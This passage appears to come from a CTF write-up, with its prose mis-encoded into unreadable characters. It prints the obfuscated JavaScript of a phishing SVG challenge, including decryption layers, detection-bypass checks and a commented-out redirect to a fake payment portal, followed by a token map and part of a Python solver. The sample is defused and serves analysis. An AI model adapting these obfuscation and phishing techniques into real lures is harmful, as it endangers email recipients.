</span></span></span><span class=line><span class=cl><span class=cp>            console.log(&#39;Stage 1 result:&#39;, combined);
</span></span></span><span class=line><span class=cl><span class=cp>            
</span></span></span><span class=line><span class=cl><span class=cp>            var finalResult = &#39;&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>            for (var k = 0; k &lt; combined.length; k++) {
</span></span></span><span class=line><span class=cl><span class=cp>              var char = combined.charCodeAt(k);
</span></span></span><span class=line><span class=cl><span class=cp>              var keyChar = dynamicKey.charCodeAt(k % dynamicKey.length);
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>              var transformed = char ^ (keyChar % 32); // Reduced XOR for readability
</span></span></span><span class=line><span class=cl><span class=cp>              finalResult += String.fromCharCode(transformed);
</span></span></span><span class=line><span class=cl><span class=cp>            }
</span></span></span><span class=line><span class=cl><span class=cp>            
</span></span></span><span class=line><span class=cl><span class=cp>            return finalResult;
</span></span></span><span class=line><span class=cl><span class=cp>            
</span></span></span><span class=line><span class=cl><span class=cp>          } catch (error) {
</span></span></span><span class=line><span class=cl><span class=cp>            console.log(&#39;Decryption failed:&#39;, error.message);
</span></span></span><span class=line><span class=cl><span class=cp>            return null;
</span></span></span><span class=line><span class=cl><span class=cp>          }
</span></span></span><span class=line><span class=cl><span class=cp>        };
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>       
</span></span></span><span class=line><span class=cl><span class=cp>        var mathematicalObfuscation = function() {
</span></span></span><span class=line><span class=cl><span class=cp>       
</span></span></span><span class=line><span class=cl><span class=cp>          var phi = 1.618033988749895; // Golden ratio
</span></span></span><span class=line><span class=cl><span class=cp>          var pi = 3.141592653589793;   // Pi
</span></span></span><span class=line><span class=cl><span class=cp>          var e = 2.718281828459045;    // Euler&#39;s number
</span></span></span><span class=line><span class=cl><span class=cp>          
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>          var mathKey = Math.floor(phi * 1000) + Math.floor(pi * 1000) + Math.floor(e * 1000);
</span></span></span><span class=line><span class=cl><span class=cp>          
</span></span></span><span class=line><span class=cl><span class=cp>         
</span></span></span><span class=line><span class=cl><span class=cp>          window.mathSegments = [
</span></span></span><span class=line><span class=cl><span class=cp>            btoa(String.fromCharCode(mathKey % 256) + segments[0]),
</span></span></span><span class=line><span class=cl><span class=cp>            btoa(String.fromCharCode((mathKey * 2) % 256) + segments[1]),
</span></span></span><span class=line><span class=cl><span class=cp>            btoa(String.fromCharCode((mathKey * 3) % 256) + segments[2]),
</span></span></span><span class=line><span class=cl><span class=cp>            btoa(String.fromCharCode((mathKey * 4) % 256) + segments[3]),
</span></span></span><span class=line><span class=cl><span class=cp>            btoa(String.fromCharCode((mathKey * 5) % 256) + segments[4])
</span></span></span><span class=line><span class=cl><span class=cp>          ];
</span></span></span><span class=line><span class=cl><span class=cp>          
</span></span></span><span class=line><span class=cl><span class=cp>          return mathKey;
</span></span></span><span class=line><span class=cl><span class=cp>        };
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>       
</span></span></span><span class=line><span class=cl><span class=cp>        var mathKey = mathematicalObfuscation();
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>       
</span></span></span><span class=line><span class=cl><span class=cp>        if (detectionBypass &amp;&amp; !jXKuzdDMGk &amp;&amp; verification()) {
</span></span></span><span class=line><span class=cl><span class=cp>          constructPayload();
</span></span></span><span class=line><span class=cl><span class=cp>          
</span></span></span><span class=line><span class=cl><span class=cp>   
</span></span></span><span class=line><span class=cl><span class=cp>          window.extractFlag = function() {
</span></span></span><span class=line><span class=cl><span class=cp>            try {
</span></span></span><span class=line><span class=cl><span class=cp>              if (window.hiddenData) {
</span></span></span><span class=line><span class=cl><span class=cp>                var encoded = atob(window.hiddenData);
</span></span></span><span class=line><span class=cl><span class=cp>                var key = &#39;WMCTF2025&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>                var decoded = &#39;&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>                for (var i = 0; i &lt; encoded.length; i++) {
</span></span></span><span class=line><span class=cl><span class=cp>                  decoded += String.fromCharCode(
</span></span></span><span class=line><span class=cl><span class=cp>                    encoded.charCodeAt(i) ^ key.charCodeAt(i % key.length)
</span></span></span><span class=line><span class=cl><span class=cp>                  );
</span></span></span><span class=line><span class=cl><span class=cp>                }
</span></span></span><span class=line><span class=cl><span class=cp>                console.log(&#39;Extracted flag:&#39;, decoded);
</span></span></span><span class=line><span class=cl><span class=cp>                return decoded;
</span></span></span><span class=line><span class=cl><span class=cp>              }
</span></span></span><span class=line><span class=cl><span class=cp>            } catch (e) {
</span></span></span><span class=line><span class=cl><span class=cp>              console.log(&#39;Flag extraction failed&#39;);
</span></span></span><span class=line><span class=cl><span class=cp>            }
</span></span></span><span class=line><span class=cl><span class=cp>          };
</span></span></span><span class=line><span class=cl><span class=cp>        }
</span></span></span><span class=line><span class=cl><span class=cp>      }
</span></span></span><span class=line><span class=cl><span class=cp>    }, 1000);
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    // Decoy functions to confuse analysis
</span></span></span><span class=line><span class=cl><span class=cp>    function generateFakeTraffic() {
</span></span></span><span class=line><span class=cl><span class=cp>      var fakeUrls = [
</span></span></span><span class=line><span class=cl><span class=cp>        &#39;https://api.example.com/data&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>        &#39;https://cdn.jsdelivr.net/npm/package&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>        &#39;https://fonts.googleapis.com/css&#39;
</span></span></span><span class=line><span class=cl><span class=cp>      ];
</span></span></span><span class=line><span class=cl><span class=cp>      // These would normally make requests but are disabled for CTF
</span></span></span><span class=line><span class=cl><span class=cp>    }
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    function createFakeElements() {
</span></span></span><span class=line><span class=cl><span class=cp>      // Create invisible elements with misleading data
</span></span></span><span class=line><span class=cl><span class=cp>      var hiddenDiv = document.createElement(&#39;div&#39;);
</span></span></span><span class=line><span class=cl><span class=cp>      hiddenDiv.style.display = &#39;none&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>      hiddenDiv.innerHTML = atob(&#39;RmFrZSBmbGFnOiBXTUNURntub3RfdGhlX3JlYWxfZmxhZ30=&#39;);
</span></span></span><span class=line><span class=cl><span class=cp>      document.body.appendChild(hiddenDiv);
</span></span></span><span class=line><span class=cl><span class=cp>    }
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    // Initialize decoy functions
</span></span></span><span class=line><span class=cl><span class=cp>    generateFakeTraffic();
</span></span></span><span class=line><span class=cl><span class=cp>    createFakeElements();
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    // Add click handler for the invoice
</span></span></span><span class=line><span class=cl><span class=cp>    document.addEventListener(&#39;click&#39;, function() {
</span></span></span><span class=line><span class=cl><span class=cp>      if (detectionBypass &amp;&amp; !jXKuzdDMGk) {
</span></span></span><span class=line><span class=cl><span class=cp>        // This would normally redirect to phishing site
</span></span></span><span class=line><span class=cl><span class=cp>        // window.location.href = &#39;https://fake-payment-portal.com&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>        console.log(&#39;Invoice clicked - in real attack, this would redirect to phishing site&#39;);
</span></span></span><span class=line><span class=cl><span class=cp>      }
</span></span></span><span class=line><span class=cl><span class=cp>    });
</span></span></span><span class=line><span class=cl><span class=cp>  ]]&gt;</span><span class=nt>&lt;/script&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/svg&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥çœ‹åˆ°æ˜ å°„è¡¨</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kd>var</span><span class=w> </span><span class=n>charMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=err>&#39;</span><span class=n>4p2V</span><span class=sc>&#39;:&#39;</span><span class=n>A</span><span class=sc>&#39;,&#39;</span><span class=n>4p2P</span><span class=sc>&#39;:&#39;</span><span class=n>D</span><span class=sc>&#39;,&#39;</span><span class=n>4p2F</span><span class=sc>&#39;:&#39;</span><span class=n>E</span><span class=sc>&#39;,&#39;</span><span class=n>4p2g</span><span class=sc>&#39;:&#39;</span><span class=n>G</span><span class=sc>&#39;,&#39;</span><span class=n>4p2a</span><span class=sc>&#39;:&#39;</span><span class=n>P</span><span class=err>&#39;</span><span class=p>,</span><span class=w>  </span><span class=err>&#39;</span><span class=n>4p2c</span><span class=sc>&#39;:&#39;</span><span class=n>S</span><span class=sc>&#39;,&#39;</span><span class=n>4oyI</span><span class=sc>&#39;:&#39;</span><span class=n>V</span><span class=sc>&#39;,&#39;</span><span class=n>4p2T</span><span class=sc>&#39;:&#39;</span><span class=n>a</span><span class=sc>&#39;,&#39;</span><span class=n>77iP</span><span class=sc>&#39;:&#39;</span><span class=n>c</span><span class=sc>&#39;,&#39;</span><span class=n>4p2S</span><span class=sc>&#39;:&#39;</span><span class=n>c</span><span class=err>&#39;</span><span class=p>,</span><span class=w>  </span><span class=err>&#39;</span><span class=n>4p2L</span><span class=sc>&#39;:&#39;</span><span class=n>c</span><span class=sc>&#39;,&#39;</span><span class=n>4p2D</span><span class=sc>&#39;:&#39;</span><span class=n>a</span><span class=sc>&#39;,&#39;</span><span class=n>4p2O</span><span class=sc>&#39;:&#39;</span><span class=n>e</span><span class=sc>&#39;,&#39;</span><span class=n>4p2M</span><span class=sc>&#39;:&#39;</span><span class=n>e</span><span class=sc>&#39;,&#39;</span><span class=n>4p2d</span><span class=sc>&#39;:&#39;</span><span class=n>f</span><span class=err>&#39;</span><span class=p>,</span><span class=w>  </span><span class=err>&#39;</span><span class=n>77iO</span><span class=sc>&#39;:&#39;</span><span class=n>g</span><span class=sc>&#39;,&#39;</span><span class=n>4p2b</span><span class=sc>&#39;:&#39;</span><span class=n>h</span><span class=sc>&#39;,&#39;</span><span class=n>4p2Z</span><span class=sc>&#39;:&#39;</span><span class=n>h</span><span class=sc>&#39;,&#39;</span><span class=n>4oyL</span><span class=sc>&#39;:&#39;</span><span class=n>i</span><span class=sc>&#39;,&#39;</span><span class=n>77iM</span><span class=sc>&#39;:&#39;</span><span class=n>i</span><span class=err>&#39;</span><span class=p>,</span><span class=w>  </span><span class=err>&#39;</span><span class=n>4p2J</span><span class=sc>&#39;:&#39;</span><span class=n>i</span><span class=sc>&#39;,&#39;</span><span class=n>4p2B</span><span class=sc>&#39;:&#39;</span><span class=n>i</span><span class=sc>&#39;,&#39;</span><span class=n>4p2R</span><span class=sc>&#39;:&#39;</span><span class=n>k</span><span class=sc>&#39;,&#39;</span><span class=n>4p2h</span><span class=sc>&#39;:&#39;</span><span class=n>m</span><span class=sc>&#39;,&#39;</span><span class=n>4p2X</span><span class=sc>&#39;:&#39;</span><span class=n>n</span><span class=err>&#39;</span><span class=p>,</span><span class=w>  </span><span class=err>&#39;</span><span class=n>4p2H</span><span class=sc>&#39;:&#39;</span><span class=n>n</span><span class=sc>&#39;,&#39;</span><span class=n>4pyx</span><span class=sc>&#39;:&#39;</span><span class=n>n</span><span class=sc>&#39;,&#39;</span><span class=n>4p2I</span><span class=sc>&#39;:&#39;</span><span class=n>o</span><span class=sc>&#39;,&#39;</span><span class=n>4p2A</span><span class=sc>&#39;:&#39;</span><span class=n>o</span><span class=sc>&#39;,&#39;</span><span class=n>4p2C</span><span class=sc>&#39;:&#39;</span><span class=n>s</span><span class=err>&#39;</span><span class=p>,</span><span class=w>  </span><span class=err>&#39;</span><span class=n>4p2Y</span><span class=sc>&#39;:&#39;</span><span class=n>s</span><span class=sc>&#39;,&#39;</span><span class=n>4p2j</span><span class=sc>&#39;:&#39;</span><span class=n>t</span><span class=sc>&#39;,&#39;</span><span class=n>77iK</span><span class=sc>&#39;:&#39;</span><span class=n>t</span><span class=sc>&#39;,&#39;</span><span class=n>4p2U</span><span class=sc>&#39;:&#39;</span><span class=n>t</span><span class=sc>&#39;,&#39;</span><span class=n>4p2K</span><span class=sc>&#39;:&#39;</span><span class=n>t</span><span class=err>&#39;</span><span class=p>,</span><span class=w>  </span><span class=err>&#39;</span><span class=n>4p2N</span><span class=sc>&#39;:&#39;</span><span class=n>t</span><span class=sc>&#39;,&#39;</span><span class=n>4p2E</span><span class=sc>&#39;:&#39;</span><span class=n>v</span><span class=sc>&#39;,&#39;</span><span class=n>4oyM</span><span class=sc>&#39;:&#39;</span><span class=n>w</span><span class=sc>&#39;,&#39;</span><span class=n>77iL</span><span class=sc>&#39;:&#39;</span><span class=p>{</span><span class=sc>&#39;,&#39;</span><span class=n>4py9</span><span class=sc>&#39;:&#39;</span><span class=p>}</span><span class=err>&#39;</span><span class=p>,</span><span class=w>  </span><span class=err>&#39;</span><span class=n>77iN</span><span class=sc>&#39;:&#39;</span><span class=n>_</span><span class=sc>&#39;,&#39;</span><span class=n>4p2W</span><span class=sc>&#39;:&#39;</span><span class=n>_</span><span class=sc>&#39;,&#39;</span><span class=n>4p2Q</span><span class=sc>&#39;:&#39;</span><span class=n>_</span><span class=sc>&#39;,&#39;</span><span class=n>4p2G</span><span class=sc>&#39;:&#39;</span><span class=n>_</span><span class=sc>&#39;,&#39;</span><span class=n>4py8</span><span class=sc>&#39;:&#39;</span><span class=o>!</span><span class=err>&#39;</span><span class=p>,</span><span class=w>  </span><span class=err>&#39;</span><span class=n>4py7</span><span class=sc>&#39;:&#39;</span><span class=o>!</span><span class=sc>&#39;,&#39;</span><span class=n>4py6</span><span class=sc>&#39;:&#39;</span><span class=o>!</span><span class=sc>&#39;,&#39;</span><span class=n>4py5</span><span class=sc>&#39;:&#39;</span><span class=o>!</span><span class=sc>&#39;,&#39;</span><span class=n>4py4</span><span class=sc>&#39;:&#39;</span><span class=o>!</span><span class=err>&#39;</span><span class=p>};</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Tokenæ›¿æ¢è§„åˆ™// /4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]/g//</p><p>æœ‰å¾ˆå¤šå¹²æ‰°é¡¹ï¼Œå…¶ä¸­çœŸæ­£æœ‰æ•ˆçš„æ•°æ®ä½äºä¸‹æ ‡ [3..7] äº”ä¸ªå…ƒç´ </p><p>å¯¹è¿™äº”ä¸ªå­—ç¬¦ä¸²ç»è¿‡ä¸€ç³»åˆ—è§£å¯†</p><p>wmctwf{SVG_Pchishing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{ng}i!t!{!i!_!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span><span class=o>,</span> <span class=nn>re</span><span class=o>,</span> <span class=nn>zipfile</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>email</span> <span class=kn>import</span> <span class=n>policy</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>email.parser</span> <span class=kn>import</span> <span class=n>BytesParser</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ---- Hardcoded input path (as requested) ----</span>
</span></span><span class=line><span class=cl><span class=n>ZIP_PATH</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;mail_phishing.zip&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Token map observed in the SVG script (superset to cover this sample)</span>
</span></span><span class=line><span class=cl><span class=n>TOKEN_MAP</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;4p2V&#39;</span><span class=p>:</span><span class=s1>&#39;A&#39;</span><span class=p>,</span><span class=s1>&#39;4p2P&#39;</span><span class=p>:</span><span class=s1>&#39;D&#39;</span><span class=p>,</span><span class=s1>&#39;4p2F&#39;</span><span class=p>:</span><span class=s1>&#39;E&#39;</span><span class=p>,</span><span class=s1>&#39;4p2g&#39;</span><span class=p>:</span><span class=s1>&#39;G&#39;</span><span class=p>,</span><span class=s1>&#39;4p2a&#39;</span><span class=p>:</span><span class=s1>&#39;P&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;4p2c&#39;</span><span class=p>:</span><span class=s1>&#39;S&#39;</span><span class=p>,</span><span class=s1>&#39;4oyI&#39;</span><span class=p>:</span><span class=s1>&#39;V&#39;</span><span class=p>,</span><span class=s1>&#39;4p2T&#39;</span><span class=p>:</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=s1>&#39;77iP&#39;</span><span class=p>:</span><span class=s1>&#39;c&#39;</span><span class=p>,</span><span class=s1>&#39;4p2S&#39;</span><span class=p>:</span><span class=s1>&#39;c&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;4p2L&#39;</span><span class=p>:</span><span class=s1>&#39;c&#39;</span><span class=p>,</span><span class=s1>&#39;4p2D&#39;</span><span class=p>:</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=s1>&#39;4p2O&#39;</span><span class=p>:</span><span class=s1>&#39;e&#39;</span><span class=p>,</span><span class=s1>&#39;4p2M&#39;</span><span class=p>:</span><span class=s1>&#39;e&#39;</span><span class=p>,</span><span class=s1>&#39;4p2d&#39;</span><span class=p>:</span><span class=s1>&#39;f&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;77iO&#39;</span><span class=p>:</span><span class=s1>&#39;g&#39;</span><span class=p>,</span><span class=s1>&#39;4p2b&#39;</span><span class=p>:</span><span class=s1>&#39;h&#39;</span><span class=p>,</span><span class=s1>&#39;4p2Z&#39;</span><span class=p>:</span><span class=s1>&#39;h&#39;</span><span class=p>,</span><span class=s1>&#39;4oyL&#39;</span><span class=p>:</span><span class=s1>&#39;i&#39;</span><span class=p>,</span><span class=s1>&#39;77iM&#39;</span><span class=p>:</span><span class=s1>&#39;i&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;4p2J&#39;</span><span class=p>:</span><span class=s1>&#39;i&#39;</span><span class=p>,</span><span class=s1>&#39;4p2B&#39;</span><span class=p>:</span><span class=s1>&#39;i&#39;</span><span class=p>,</span><span class=s1>&#39;4p2R&#39;</span><span class=p>:</span><span class=s1>&#39;k&#39;</span><span class=p>,</span><span class=s1>&#39;4p2h&#39;</span><span class=p>:</span><span class=s1>&#39;m&#39;</span><span class=p>,</span><span class=s1>&#39;4p2X&#39;</span><span class=p>:</span><span class=s1>&#39;n&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;4p2H&#39;</span><span class=p>:</span><span class=s1>&#39;n&#39;</span><span class=p>,</span><span class=s1>&#39;4pyx&#39;</span><span class=p>:</span><span class=s1>&#39;n&#39;</span><span class=p>,</span><span class=s1>&#39;4p2I&#39;</span><span class=p>:</span><span class=s1>&#39;o&#39;</span><span class=p>,</span><span class=s1>&#39;4p2A&#39;</span><span class=p>:</span><span class=s1>&#39;o&#39;</span><span class=p>,</span><span class=s1>&#39;4p2C&#39;</span><span class=p>:</span><span class=s1>&#39;s&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;4p2Y&#39;</span><span class=p>:</span><span class=s1>&#39;s&#39;</span><span class=p>,</span><span class=s1>&#39;4p2j&#39;</span><span class=p>:</span><span class=s1>&#39;t&#39;</span><span class=p>,</span><span class=s1>&#39;77iK&#39;</span><span class=p>:</span><span class=s1>&#39;t&#39;</span><span class=p>,</span><span class=s1>&#39;4p2U&#39;</span><span class=p>:</span><span class=s1>&#39;t&#39;</span><span class=p>,</span><span class=s1>&#39;4p2K&#39;</span><span class=p>:</span><span class=s1>&#39;t&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;4p2N&#39;</span><span class=p>:</span><span class=s1>&#39;t&#39;</span><span class=p>,</span><span class=s1>&#39;4p2E&#39;</span><span class=p>:</span><span class=s1>&#39;v&#39;</span><span class=p>,</span><span class=s1>&#39;4oyM&#39;</span><span class=p>:</span><span class=s1>&#39;w&#39;</span><span class=p>,</span><span class=s1>&#39;77iL&#39;</span><span class=p>:</span><span class=s1>&#39;{&#39;</span><span class=p>,</span><span class=s1>&#39;4py9&#39;</span><span class=p>:</span><span class=s1>&#39;}&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;77iN&#39;</span><span class=p>:</span><span class=s1>&#39;_&#39;</span><span class=p>,</span><span class=s1>&#39;4p2W&#39;</span><span class=p>:</span><span class=s1>&#39;_&#39;</span><span class=p>,</span><span class=s1>&#39;4p2Q&#39;</span><span class=p>:</span><span class=s1>&#39;_&#39;</span><span class=p>,</span><span class=s1>&#39;4p2G&#39;</span><span class=p>:</span><span class=s1>&#39;_&#39;</span><span class=p>,</span><span class=s1>&#39;4py8&#39;</span><span class=p>:</span><span class=s1>&#39;!&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;4py7&#39;</span><span class=p>:</span><span class=s1>&#39;!&#39;</span><span class=p>,</span><span class=s1>&#39;4py6&#39;</span><span class=p>:</span><span class=s1>&#39;!&#39;</span><span class=p>,</span><span class=s1>&#39;4py5&#39;</span><span class=p>:</span><span class=s1>&#39;!&#39;</span><span class=p>,</span><span class=s1>&#39;4py4&#39;</span><span class=p>:</span><span class=s1>&#39;!&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1># Regex used in the sample JS (we accept a superset including 4py*)</span>
</span></span><span class=line><span class=cl><span class=n>TOKEN_RE</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]|4oy[a-zA-Z0-9]|4py[a-zA-Z0-9]&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>unzip</span><span class=p>(</span><span class=n>src_zip</span><span class=p>:</span> <span class=n>Path</span><span class=p>,</span> <span class=n>out_dir</span><span class=p>:</span> <span class=n>Path</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Path</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>out_dir</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=n>parents</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>zipfile</span><span class=o>.</span><span class=n>ZipFile</span><span class=p>(</span><span class=n>src_zip</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>z</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>z</span><span class=o>.</span><span class=n>extractall</span><span class=p>(</span><span class=n>out_dir</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>out_dir</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_eml_attachments</span><span class=p>(</span><span class=n>eml_path</span><span class=p>:</span> <span class=n>Path</span><span class=p>,</span> <span class=n>out_dir</span><span class=p>:</span> <span class=n>Path</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>out_dir</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=n>parents</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>eml_path</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>msg</span> <span class=o>=</span> <span class=n>BytesParser</span><span class=p>(</span><span class=n>policy</span><span class=o>=</span><span class=n>policy</span><span class=o>.</span><span class=n>default</span><span class=p>)</span><span class=o>.</span><span class=n>parse</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>part</span> <span class=ow>in</span> <span class=n>msg</span><span class=o>.</span><span class=n>walk</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>part</span><span class=o>.</span><span class=n>is_multipart</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
